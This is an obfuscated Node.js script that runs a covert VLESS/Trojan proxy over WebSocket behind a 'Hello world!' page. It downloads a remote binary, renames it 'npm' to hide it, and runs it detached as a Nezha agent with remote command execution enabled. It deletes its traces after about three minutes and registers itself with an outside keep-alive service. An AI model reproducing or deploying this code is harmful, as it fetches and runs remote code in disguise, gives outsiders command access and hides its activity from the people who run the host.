const _0x1401e6=_0x3dc2;(function(_0x574e84,_0x37d0d8){const _0x2cf86e=_0x3dc2,_0x3bace4=_0x574e84();while(!![]){try{const _0x3099b1=-parseInt(_0x2cf86e(0x13d))/0x1*(-parseInt(_0x2cf86e(0x185))/0x2)+-parseInt(_0x2cf86e(0x138))/0x3+-parseInt(_0x2cf86e(0x135))/0x4*(-parseInt(_0x2cf86e(0x17e))/0x5)+parseInt(_0x2cf86e(0x10a))/0x6*(parseInt(_0x2cf86e(0x15f))/0x7)+parseInt(_0x2cf86e(0x129))/0x8+parseInt(_0x2cf86e(0x118))/0x9+parseInt(_0x2cf86e(0x122))/0xa*(-parseInt(_0x2cf86e(0x131))/0xb);if(_0x3099b1===_0x37d0d8)break;else _0x3bace4['push'](_0x3bace4['shift']());}catch(_0xe305a5){_0x3bace4['push'](_0x3bace4['shift']());}}}(_0x584f,0x5dda7));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x1401e6(0x14c)),net=require(_0x1401e6(0x126)),path=require(_0x1401e6(0x15e)),crypto=require(_0x1401e6(0x11c)),{Buffer}=require(_0x1401e6(0x120)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1401e6(0x14e)][_0x1401e6(0x146)]||_0x1401e6(0x18b),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x1401e6(0x14e)][_0x1401e6(0x11a)]||'',NEZHA_KEY=process[_0x1401e6(0x14e)][_0x1401e6(0x16a)]||'',DOMAIN=process[_0x1401e6(0x14e)]['DOMAIN']||_0x1401e6(0x177),AUTO_ACCESS=process[_0x1401e6(0x14e)][_0x1401e6(0x132)]||!![],WSPATH=process[_0x1401e6(0x14e)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x1401e6(0x14e)][_0x1401e6(0x16e)]||'sub',NAME=process['env'][_0x1401e6(0x13c)]||_0x1401e6(0x10f),PORT=process[_0x1401e6(0x14e)][_0x1401e6(0x11f)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x578a6a=_0x1401e6;try{const _0xdd1085=await axios[_0x578a6a(0x139)](_0x578a6a(0x110)),_0x119d4f=_0xdd1085[_0x578a6a(0x186)];ISP=(_0x119d4f[_0x578a6a(0x112)]+'-'+_0x119d4f[_0x578a6a(0x12d)])[_0x578a6a(0x163)](/ /g,'_');}catch(_0x1c46ed){ISP=_0x578a6a(0x14b);}};GetISP();const httpServer=http[_0x1401e6(0x176)]((_0x361853,_0x18951b)=>{const _0x46571f=_0x1401e6;if(_0x361853[_0x46571f(0x18a)]==='/'){const _0x1a51dd=path[_0x46571f(0x145)](__dirname,_0x46571f(0x119));fs['readFile'](_0x1a51dd,_0x46571f(0x152),(_0x25b84d,_0x3da4b6)=>{const _0x550914=_0x46571f;if(_0x25b84d){_0x18951b[_0x550914(0x130)](0xc8,{'Content-Type':_0x550914(0x125)}),_0x18951b[_0x550914(0x137)](_0x550914(0x147));return;}_0x18951b[_0x550914(0x130)](0xc8,{'Content-Type':_0x550914(0x125)}),_0x18951b['end'](_0x3da4b6);});return;}else{if(_0x361853[_0x46571f(0x18a)]==='/'+SUB_PATH){const _0xc74a22=_0x46571f(0x173)+UUID+'@'+DOMAIN+_0x46571f(0x155)+DOMAIN+_0x46571f(0x142)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x501be8='trojan://'+UUID+'@'+DOMAIN+_0x46571f(0x13e)+DOMAIN+_0x46571f(0x142)+DOMAIN+_0x46571f(0x162)+WSPATH+'#'+NAME+'-'+ISP,_0x4e44a7=_0xc74a22+'\x0a'+_0x501be8,_0x80d21f=Buffer[_0x46571f(0x16d)](_0x4e44a7)[_0x46571f(0x12a)](_0x46571f(0x17c));_0x18951b[_0x46571f(0x130)](0xc8,{'Content-Type':_0x46571f(0x188)}),_0x18951b['end'](_0x80d21f+'\x0a');}else _0x18951b[_0x46571f(0x130)](0x194,{'Content-Type':_0x46571f(0x188)}),_0x18951b[_0x46571f(0x137)](_0x46571f(0x136));}}),wss=new WebSocket[(_0x1401e6(0x178))]({'server':httpServer}),uuid=UUID[_0x1401e6(0x163)](/-/g,''),DNS_SERVERS=[_0x1401e6(0x15b),_0x1401e6(0x10c)];function resolveHost(_0x30d2d9){return new Promise((_0x42d9e9,_0x174e02)=>{const _0x3c1ba4=_0x3dc2;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3c1ba4(0x170)](_0x30d2d9)){_0x42d9e9(_0x30d2d9);return;}let _0x448c26=0x0;function _0x59b509(){const _0x500a87=_0x3c1ba4;if(_0x448c26>=DNS_SERVERS[_0x500a87(0x169)]){_0x174e02(new Error(_0x500a87(0x166)+_0x30d2d9+_0x500a87(0x17f)));return;}const _0x2d8a2a=DNS_SERVERS[_0x448c26];_0x448c26++;const _0x299024='https://dns.google/resolve?name='+encodeURIComponent(_0x30d2d9)+'&type=A';axios['get'](_0x299024,{'timeout':0x1388,'headers':{'Accept':_0x500a87(0x17b)}})[_0x500a87(0x168)](_0x497459=>{const _0x18375f=_0x500a87,_0x216b70=_0x497459['data'];if(_0x216b70[_0x18375f(0x14d)]===0x0&&_0x216b70[_0x18375f(0x174)]&&_0x216b70[_0x18375f(0x174)][_0x18375f(0x169)]>0x0){const _0x1aa74b=_0x216b70[_0x18375f(0x174)][_0x18375f(0x140)](_0xfbae8c=>_0xfbae8c[_0x18375f(0x13f)]===0x1);if(_0x1aa74b){_0x42d9e9(_0x1aa74b[_0x18375f(0x186)]);return;}}_0x59b509();})[_0x500a87(0x10e)](_0x2a7e0c=>{_0x59b509();});}_0x59b509();});}function handleVlessConnection(_0x18770d,_0x19c6c0){const _0x24ca9d=_0x1401e6,[_0x3a1a9c]=_0x19c6c0,_0x47bed9=_0x19c6c0[_0x24ca9d(0x141)](0x1,0x11);if(!_0x47bed9[_0x24ca9d(0x15c)]((_0x427b97,_0x569b7b)=>_0x427b97==parseInt(uuid[_0x24ca9d(0x164)](_0x569b7b*0x2,0x2),0x10)))return![];let _0x5ea1b0=_0x19c6c0[_0x24ca9d(0x141)](0x11,0x12)[_0x24ca9d(0x182)]()+0x13;const _0x40254c=_0x19c6c0['slice'](_0x5ea1b0,_0x5ea1b0+=0x2)[_0x24ca9d(0x14a)](0x0),_0x34c1b6=_0x19c6c0[_0x24ca9d(0x141)](_0x5ea1b0,_0x5ea1b0+=0x1)[_0x24ca9d(0x182)](),_0x744a84=_0x34c1b6==0x1?_0x19c6c0['slice'](_0x5ea1b0,_0x5ea1b0+=0x4)[_0x24ca9d(0x145)]('.'):_0x34c1b6==0x2?new TextDecoder()['decode'](_0x19c6c0['slice'](_0x5ea1b0+0x1,_0x5ea1b0+=0x1+_0x19c6c0[_0x24ca9d(0x141)](_0x5ea1b0,_0x5ea1b0+0x1)['readUInt8']())):_0x34c1b6==0x3?_0x19c6c0['slice'](_0x5ea1b0,_0x5ea1b0+=0x10)[_0x24ca9d(0x161)]((_0x222b52,_0x489f6,_0x308502,_0x33c7c8)=>_0x308502%0x2?_0x222b52[_0x24ca9d(0x134)](_0x33c7c8['slice'](_0x308502-0x1,_0x308502+0x1)):_0x222b52,[])[_0x24ca9d(0x10d)](_0x60df99=>_0x60df99['readUInt16BE'](0x0)[_0x24ca9d(0x12a)](0x10))[_0x24ca9d(0x145)](':'):'';_0x18770d[_0x24ca9d(0x158)](new Uint8Array([_0x3a1a9c,0x0]));const _0x29177e=createWebSocketStream(_0x18770d);return resolveHost(_0x744a84)['then'](_0x58fd11=>{const _0x1c2535=_0x24ca9d;net[_0x1c2535(0x11d)]({'host':_0x58fd11,'port':_0x40254c},function(){const _0x3d7847=_0x1c2535;this['write'](_0x19c6c0[_0x3d7847(0x141)](_0x5ea1b0)),_0x29177e['on']('error',()=>{})[_0x3d7847(0x154)](this)['on'](_0x3d7847(0x167),()=>{})['pipe'](_0x29177e);})['on'](_0x1c2535(0x167),()=>{});})[_0x24ca9d(0x10e)](_0x11c9cd=>{const _0x862a0=_0x24ca9d;net[_0x862a0(0x11d)]({'host':_0x744a84,'port':_0x40254c},function(){const _0x136149=_0x862a0;this['write'](_0x19c6c0[_0x136149(0x141)](_0x5ea1b0)),_0x29177e['on'](_0x136149(0x167),()=>{})[_0x136149(0x154)](this)['on'](_0x136149(0x167),()=>{})[_0x136149(0x154)](_0x29177e);})['on'](_0x862a0(0x167),()=>{});}),!![];}function _0x584f(){const _0x49978e=['asOrganization','connection','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','writeHead','87351OxbLSb','AUTO_ACCESS','8443','concat','1916DkwzLm','Not\x20Found\x0a','end','292182Vdszjg','get','https://amd64.ssss.nyc.mn/agent','false','NAME','23QfYLIY',':443?security=tls&sni=','type','find','slice','&fp=chrome&type=ws&host=','unlink','npm\x20is\x20running','join','UUID','Hello\x20world!','https://arm64.ssss.nyc.mn/agent','stream','readUInt16BE','Unknown','axios','Status','env','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','--tls','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','utf8','arm','pipe',':443?encryption=none&security=tls&sni=','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','application/json','send','2096','utf-8','8.8.4.4','every','Server\x20is\x20running\x20on\x20port\x20','path','4687739RLKKtU','setsid\x20nohup\x20./npm\x20-s\x20','reduce','&path=%2F','replace','substr','https://amd64.ssss.nyc.mn/v1','Failed\x20to\x20resolve\x20','error','then','length','NEZHA_KEY','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','log','from','SUB_PATH','includes','test','https://','close','vless://','Answer','\x20-p\x20','createServer','US.CMLiussss.net','Server','writeFileSync','/bin/bash','application/dns-json','base64','error:\x20','5935UXysWy','\x20with\x20all\x20DNS\x20servers','arm64','443','readUInt8','true','chmod\x20+x\x20npm','19506glzIUJ','data','write','text/plain','npm\x20download\x20successfully','url','32017281-21e5-46ec-b409-bbe2a29f9263','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','npm','6cMWKBi','config.yaml','1.1.1.1','map','catch','Hug','https://speed.cloudflare.com/meta','2087','country','npm\x20running\x20error:','message','post','arch','hex','261333Sywmcr','index.html','NEZHA_PORT','update','crypto','connect','https://arm64.ssss.nyc.mn/v1','PORT','buffer','trim','1930zkMsgv','2083','finish','text/html','net','createWriteStream','split','4182592tEMnPG','toString','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm\x20is\x20already\x20running,\x20skip\x20running...'];_0x584f=function(){return _0x49978e;};return _0x584f();}function handleTrojanConnection(_0x18a032,_0x4003ec){const _0x5e11d2=_0x1401e6;try{if(_0x4003ec[_0x5e11d2(0x169)]<0x3a)return![];const _0x1c4283=_0x4003ec['slice'](0x0,0x38)[_0x5e11d2(0x12a)](),_0x8daba1=[UUID];let _0x49b0b4=null;for(const _0x248772 of _0x8daba1){const _0x2b0df9=crypto['createHash']('sha224')[_0x5e11d2(0x11b)](_0x248772)['digest'](_0x5e11d2(0x117));if(_0x2b0df9===_0x1c4283){_0x49b0b4=_0x248772;break;}}if(!_0x49b0b4)return![];let _0x7bc5c8=0x38;_0x4003ec[_0x7bc5c8]===0xd&&_0x4003ec[_0x7bc5c8+0x1]===0xa&&(_0x7bc5c8+=0x2);const _0x146b28=_0x4003ec[_0x7bc5c8];if(_0x146b28!==0x1)return![];_0x7bc5c8+=0x1;const _0xae20ad=_0x4003ec[_0x7bc5c8];_0x7bc5c8+=0x1;let _0x37a4b3,_0x3624d3;if(_0xae20ad===0x1)_0x37a4b3=_0x4003ec['slice'](_0x7bc5c8,_0x7bc5c8+0x4)['join']('.'),_0x7bc5c8+=0x4;else{if(_0xae20ad===0x3){const _0x51cefa=_0x4003ec[_0x7bc5c8];_0x7bc5c8+=0x1,_0x37a4b3=_0x4003ec[_0x5e11d2(0x141)](_0x7bc5c8,_0x7bc5c8+_0x51cefa)[_0x5e11d2(0x12a)](),_0x7bc5c8+=_0x51cefa;}else{if(_0xae20ad===0x4)_0x37a4b3=_0x4003ec[_0x5e11d2(0x141)](_0x7bc5c8,_0x7bc5c8+0x10)['reduce']((_0x376119,_0x209168,_0x4852f2,_0x50b2f6)=>_0x4852f2%0x2?_0x376119[_0x5e11d2(0x134)](_0x50b2f6[_0x5e11d2(0x141)](_0x4852f2-0x1,_0x4852f2+0x1)):_0x376119,[])[_0x5e11d2(0x10d)](_0xb1ffa7=>_0xb1ffa7[_0x5e11d2(0x14a)](0x0)[_0x5e11d2(0x12a)](0x10))[_0x5e11d2(0x145)](':'),_0x7bc5c8+=0x10;else return![];}}_0x3624d3=_0x4003ec[_0x5e11d2(0x14a)](_0x7bc5c8),_0x7bc5c8+=0x2;_0x7bc5c8<_0x4003ec['length']&&_0x4003ec[_0x7bc5c8]===0xd&&_0x4003ec[_0x7bc5c8+0x1]===0xa&&(_0x7bc5c8+=0x2);const _0x5e146e=createWebSocketStream(_0x18a032);return resolveHost(_0x37a4b3)[_0x5e11d2(0x168)](_0xf72d56=>{const _0x521274=_0x5e11d2;net[_0x521274(0x11d)]({'host':_0xf72d56,'port':_0x3624d3},function(){const _0x2ea800=_0x521274;_0x7bc5c8<_0x4003ec[_0x2ea800(0x169)]&&this[_0x2ea800(0x187)](_0x4003ec[_0x2ea800(0x141)](_0x7bc5c8)),_0x5e146e['on'](_0x2ea800(0x167),()=>{})[_0x2ea800(0x154)](this)['on'](_0x2ea800(0x167),()=>{})[_0x2ea800(0x154)](_0x5e146e);})['on'](_0x521274(0x167),()=>{});})[_0x5e11d2(0x10e)](_0x3cde80=>{const _0x1bc9b4=_0x5e11d2;net[_0x1bc9b4(0x11d)]({'host':_0x37a4b3,'port':_0x3624d3},function(){const _0x425fd1=_0x1bc9b4;_0x7bc5c8<_0x4003ec['length']&&this[_0x425fd1(0x187)](_0x4003ec[_0x425fd1(0x141)](_0x7bc5c8)),_0x5e146e['on'](_0x425fd1(0x167),()=>{})[_0x425fd1(0x154)](this)['on'](_0x425fd1(0x167),()=>{})[_0x425fd1(0x154)](_0x5e146e);})['on'](_0x1bc9b4(0x167),()=>{});}),!![];}catch(_0x2b2b5c){return![];}}function _0x3dc2(_0x3e7e39,_0xbfa878){const _0x584fd0=_0x584f();return _0x3dc2=function(_0x3dc2b4,_0x1bdf75){_0x3dc2b4=_0x3dc2b4-0x108;let _0x18062b=_0x584fd0[_0x3dc2b4];return _0x18062b;},_0x3dc2(_0x3e7e39,_0xbfa878);}wss['on'](_0x1401e6(0x12e),(_0x39db67,_0x433a65)=>{const _0x707753=_0x1401e6,_0x15b14d=_0x433a65[_0x707753(0x18a)]||'';_0x39db67['once'](_0x707753(0x114),_0x27a1bb=>{const _0x435ab5=_0x707753;if(_0x27a1bb[_0x435ab5(0x169)]>0x11&&_0x27a1bb[0x0]===0x0){const _0x466051=_0x27a1bb[_0x435ab5(0x141)](0x1,0x11),_0x55aa3a=_0x466051[_0x435ab5(0x15c)]((_0x4fa63b,_0x2d262d)=>_0x4fa63b==parseInt(uuid['substr'](_0x2d262d*0x2,0x2),0x10));if(_0x55aa3a){!handleVlessConnection(_0x39db67,_0x27a1bb)&&_0x39db67[_0x435ab5(0x172)]();return;}}!handleTrojanConnection(_0x39db67,_0x27a1bb)&&_0x39db67['close']();})['on'](_0x707753(0x167),()=>{});});const getDownloadUrl=()=>{const _0x3c389d=_0x1401e6,_0xf04ceb=os[_0x3c389d(0x116)]();return _0xf04ceb===_0x3c389d(0x153)||_0xf04ceb===_0x3c389d(0x180)||_0xf04ceb==='aarch64'?!NEZHA_PORT?_0x3c389d(0x11e):_0x3c389d(0x148):!NEZHA_PORT?_0x3c389d(0x165):_0x3c389d(0x13a);},downloadFile=async()=>{const _0x412f2f=_0x1401e6;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x22d3d4=getDownloadUrl(),_0x4357bd=await axios({'method':_0x412f2f(0x139),'url':_0x22d3d4,'responseType':_0x412f2f(0x149)}),_0x896298=fs[_0x412f2f(0x127)](_0x412f2f(0x109));return _0x4357bd[_0x412f2f(0x186)][_0x412f2f(0x154)](_0x896298),new Promise((_0x606417,_0x160006)=>{const _0xd13cb=_0x412f2f;_0x896298['on'](_0xd13cb(0x124),()=>{const _0x4a79ed=_0xd13cb;console[_0x4a79ed(0x16c)](_0x4a79ed(0x189)),exec(_0x4a79ed(0x184),_0x3da2dd=>{if(_0x3da2dd)_0x160006(_0x3da2dd);_0x606417();});}),_0x896298['on'](_0xd13cb(0x167),_0x160006);});}catch(_0x51c00d){throw _0x51c00d;}},runnz=async()=>{const _0x4cda92=_0x1401e6;try{const _0x574144=execSync(_0x4cda92(0x14f),{'encoding':_0x4cda92(0x15a)});if(_0x574144[_0x4cda92(0x121)]()!==''){console[_0x4cda92(0x16c)](_0x4cda92(0x12c));return;}}catch(_0x5b532a){}await downloadFile();let _0x14faac='',_0x121c8e=[_0x4cda92(0x181),_0x4cda92(0x133),_0x4cda92(0x159),_0x4cda92(0x111),_0x4cda92(0x123),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x59d0a0=_0x121c8e['includes'](NEZHA_PORT)?_0x4cda92(0x150):'';_0x14faac=_0x4cda92(0x160)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4cda92(0x175)+NEZHA_KEY+'\x20'+_0x59d0a0+_0x4cda92(0x12b);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3aed03=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4cda92(0x128)](':')['pop']():'',_0x443bea=_0x121c8e[_0x4cda92(0x16f)](_0x3aed03)?_0x4cda92(0x183):_0x4cda92(0x13b),_0x257797='client_secret:\x20'+NEZHA_KEY+_0x4cda92(0x151)+NEZHA_SERVER+_0x4cda92(0x156)+_0x443bea+_0x4cda92(0x12f)+UUID;fs[_0x4cda92(0x179)](_0x4cda92(0x10b),_0x257797);}_0x14faac=_0x4cda92(0x16b);}else{console[_0x4cda92(0x16c)](_0x4cda92(0x108));return;}}try{exec(_0x14faac,{'shell':_0x4cda92(0x17a)},_0x5b1f3b=>{const _0x4d6720=_0x4cda92;if(_0x5b1f3b)console['error'](_0x4d6720(0x113),_0x5b1f3b);else console['log'](_0x4d6720(0x144));});}catch(_0xd6c0a2){console[_0x4cda92(0x167)](_0x4cda92(0x17d)+_0xd6c0a2);}};async function addAccessTask(){const _0x3b9d5f=_0x1401e6;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x184a0f=_0x3b9d5f(0x171)+DOMAIN+'/'+SUB_PATH;try{const _0x4a173f=await axios[_0x3b9d5f(0x115)]('https://oooo.serv00.net/add-url',{'url':_0x184a0f},{'headers':{'Content-Type':_0x3b9d5f(0x157)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4ee5be){}}const delFiles=()=>{const _0x53d93a=_0x1401e6;fs[_0x53d93a(0x143)](_0x53d93a(0x109),()=>{}),fs[_0x53d93a(0x143)](_0x53d93a(0x10b),()=>{});};httpServer['listen'](PORT,()=>{const _0x370404=_0x1401e6;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x370404(0x15d)+PORT);});
